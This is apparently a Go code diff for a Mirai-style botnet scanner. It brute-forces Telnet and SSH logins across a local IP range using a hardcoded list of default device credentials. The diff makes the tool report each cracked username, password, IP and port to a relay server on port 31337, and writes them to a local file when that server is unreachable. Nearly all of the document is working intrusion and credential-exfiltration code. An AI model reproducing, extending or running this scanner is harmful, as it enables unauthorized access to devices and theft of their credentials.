@@ -5,13 +5,12 @@ import (
 	"net"
 	"strings"
 	"time"
-
+	"os"
 	"golang.org/x/crypto/ssh"
 )
 
 var (
 	MAlist = [][]string{
-
         {"root", "vizxv"},
 		{"admin", "password"},
 		{"root", "admin"},
@@ -73,7 +72,7 @@ var (
         {"mother", "fucker"},
     }
 
-	__RELAY_H__   = "192.168.1.158"
+	__RELAY_H__   = "192.168.1.97"
 	__RELAY_P__   = 31337
 	__RELAY_PS_   = "||"
 	__TIMEOUT__   = 2 * time.Second
@@ -88,37 +87,9 @@ func getCredentials(pindex int) (string, string) {
 	return user, password
 }
 
-func c2crd(usr, psw, ip string, port int) {
-	for {
-		fmt.Println("[Scanner] Sending credentials to remote relay..")
-		tcpClientA, err := net.Dial("tcp", fmt.Sprintf("%s:%d", __RELAY_H__, __RELAY_P__))
-		if err != nil {
-			fmt.Printf("[Scanner] Unable to contact remote relay (%s)\n", err)
-			time.Sleep(__C2DELAY__)
-			continue
-		}
-		tcpClientA.Write([]byte(fmt.Sprintf("!%s%s%s%s%d", __RELAY_PS_, usr, __RELAY_PS_, psw, port)))
-		data := make([]byte, 1024)
-		n, err := tcpClientA.Read(data)
-		if err != nil {
-			fmt.Printf("[Scanner] Unable to read data from remote relay (%s)\n", err)
-			tcpClientA.Close()
-			time.Sleep(__C2DELAY__)
-			continue
-		}
-		dataStr := string(data[:n])
-		if dataStr == "10" {
-			tcpClientA.Close()
-			fmt.Println("[Scanner] Remote relay returned code 10(ok).")
-			break
-		}
-		tcpClientA.Close()
-	}
-}
-
-func isTelnetOpen(ip string) {
+func isTelnetOpen(ip string,port string) {
 	fmt.Printf("[Scanner] Scanning %s..\n", ip)
-	conn, err := net.DialTimeout("tcp", ip + ":23", __TIMEOUT__)
+	conn, err := net.DialTimeout("tcp", ip + ":"+port, __TIMEOUT__)
 	defer conn.Close()
 	if err == nil {
 		fmt.Printf("[Scanner] Found IP address: %s\n", ip)
@@ -145,6 +116,11 @@ func isTelnetOpen(ip string) {
 					}
 					if strings.Contains(s,"#"){
 						fmt.Println("Sucessful")
+						if validateC2(ip,"23"){
+							c2crd(user,password,ip,"23")
+						}else{
+							writetolocal(user+":"+password)
+						}
 						return 
 					}
 					if strings.Contains(s,"login")||strings.Contains(s,"Password"){
@@ -172,7 +148,6 @@ func isTelnetOpen(ip string) {
 		return 
 	}
 }
-
 
 func isSSHOpen(ip string) {
 	pindex := 0
@@ -210,15 +185,48 @@ func isSSHOpen(ip string) {
 	}
 }
 
+func writetolocal(data string ){
+	filename := "store.txt"
+	_, err := os.Stat(filename)
+	if os.IsNotExist(err) {
+		// 檔案不存在，建立檔案並寫入內容
+		file, err := os.Create(filename)
+		if err != nil {
+			fmt.Println("無法建立檔案:", err)
+			return
+		}
+		defer file.Close()
 
-func telnetConnect(ip string, port int) (net.Conn, error) {
-	return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), __TIMEOUT__)
+		_, err = file.WriteString(data)
+		if err != nil {
+			fmt.Println("寫入檔案失敗:", err)
+			return
+		}
+
+		fmt.Println("已建立新檔案並寫入內容")
+	} else {
+		// 檔案存在，直接寫入內容
+		file, err := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND, 0644)
+		if err != nil {
+			fmt.Println("開啟檔案失敗:", err)
+			return
+		}
+		defer file.Close()
+
+		_, err = file.WriteString(data)
+		if err != nil {
+			fmt.Println("寫入檔案失敗:", err)
+			return
+		}
+
+		fmt.Println("已寫入內容到現有檔案")
+	}
 }
 
-func validateC2() {
+func validateC2(ip string,port string )bool {
 	fmt.Println("[Scanner] Connecting to remote relay ...")
 	for {
-		tcpClientA, err := net.Dial("tcp", fmt.Sprintf("%s:%d", __RELAY_H__, __RELAY_P__))
+		tcpClientA, err := net.Dial("tcp",  fmt.Sprintf("%s:%d", __RELAY_H__, __RELAY_P__))
 		if err == nil {
 			tcpClientA.Write([]byte("#"))
 			data := make([]byte, 1024)
@@ -228,13 +236,42 @@ func validateC2() {
 				if dataStr == "200" {
 					tcpClientA.Close()
 					fmt.Println("[Scanner] Remote relay returned code 200(online).")
-					break
+					return true
 				}
 			}
 			tcpClientA.Close()
 		}
 		fmt.Printf("[Scanner] Remote relay unreachable retrying in %s ...\n", __C2DELAY__)
 		time.Sleep(__C2DELAY__)
+	}
+	return false
+}
+
+func c2crd(usr string, psw string, ip string, port string) {
+	for {
+		fmt.Println("[Scanner] Sending credentials to remote relay..")
+		tcpClientA, err := net.Dial("tcp", fmt.Sprintf("%s:%d", __RELAY_H__, __RELAY_P__))
+		if err != nil {
+			fmt.Printf("[Scanner] Unable to contact remote relay (%s)\n", err)
+			time.Sleep(__C2DELAY__)
+			continue
+		}
+		tcpClientA.Write([]byte("!" + __RELAY_PS_ + usr + __RELAY_PS_ + psw + __RELAY_PS_ + ip + __RELAY_PS_ + port))
+		data := make([]byte, 1024)
+		n, err := tcpClientA.Read(data)
+		if err != nil {
+			fmt.Printf("[Scanner] Unable to read data from remote relay (%s)\n", err)
+			tcpClientA.Close()
+			time.Sleep(__C2DELAY__)
+			continue
+		}
+		dataStr := string(data[:n])
+		if dataStr == "10" {
+			tcpClientA.Close()
+			fmt.Println("[Scanner] Remote relay returned code 10(ok).")
+			break
+		}
+		tcpClientA.Close()
 	}
 }
 
@@ -248,11 +285,11 @@ func Scanner(choose int) {
 			go isSSHOpen(generateIP(i))
 		}
 		for i := 1; i <= 255; i++ {
-			go isTelnetOpen(generateIP(i))
+			go isTelnetOpen(generateIP(i),"23")
 		}
 	} else {
 		fmt.Println("Try to scan Telnet ---------------")
-		isTelnetOpen("192.168.1.167")
+		isTelnetOpen("192.168.1.167","23")
 		fmt.Println("Try to scan SSH ---------------")
 		isSSHOpen("192.168.1.167")
 	}
@@ -262,7 +299,9 @@ func Scanner(choose int) {
 func main() {
 	fmt.Println("[Scanner] Scanner process started ..")
 	//isSSHOpen("192.168.1.163")
-	isTelnetOpen("192.168.1.181")
-	//go validateC2() // Test to connect remote DB
-	//Scanner(2)
+	isTelnetOpen("192.168.1.181","23")
+	//if validateC2("192.168.1.97","31337"){
+	//	c2crd("test","test","192.168.1.97","31337")
+	//} //test connect relay
+	
 }
